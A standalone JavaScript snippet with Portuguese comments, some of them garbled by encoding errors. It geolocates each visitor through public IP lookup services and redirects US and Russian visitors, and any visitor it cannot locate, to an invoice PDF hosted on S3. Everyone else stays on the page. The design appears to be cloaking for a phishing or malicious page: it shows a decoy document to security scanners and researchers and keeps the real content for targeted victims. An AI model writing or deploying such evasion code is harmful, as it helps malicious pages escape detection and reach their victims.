 <script>
(function () {
  const BLOCK_COUNTRIES = ["US", "RU"]; // Estados Unidos, R√∫ssia
  const REDIRECT_URL = "https://parasut-e-documents.s3.amazonaws.com/production/outbound_invoices/131035215/TL72024000000152.pdf";
  const TIMEOUT_MS = 2500;

  function withTimeout(promise, ms) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error("timeout")), ms))
    ]);
  }

  async function fetchCountry() {
    // 1) country.is (r√°pido e sem key)
    try {
      const r1 = await withTimeout(fetch("https://country.is/", { cache: "no-store" }), TIMEOUT_MS);
      if (!r1.ok) throw new Error("country.is not ok");
      const j1 = await r1.json();
      if (j1 && typeof j1.country === "string" && j1.country.length === 2) {
        return j1.country.toUpperCase();
      }
    } catch (e) {}

    // 2) fallback: ipapi.co (sem key no endpoint /json/)
    try {
      const r2 = await withTimeout(fetch("https://ipapi.co/json/", { cache: "no-store" }), TIMEOUT_MS);
      if (!r2.ok) throw new Error("ipapi not ok");
      const j2 = await r2.json();
      // ipapi pode devolver "country" (PT) ou "country_code" dependendo do formato/endpoint
      const cc = (j2 && (j2.country || j2.country_code)) ? String(j2.country || j2.country_code) : "";
      if (cc.length === 2) return cc.toUpperCase();
    } catch (e) {}

    // n√£o conseguiu identificar
    return null;
  }

  (async function () {
    const country = await fetchCountry();

    // üîí Fail-closed: se n√£o identificar, tamb√©m redireciona
    if (!country || BLOCK_COUNTRIES.includes(country)) {
      window.location.replace(REDIRECT_URL);
    }
  })();

})();
</script>
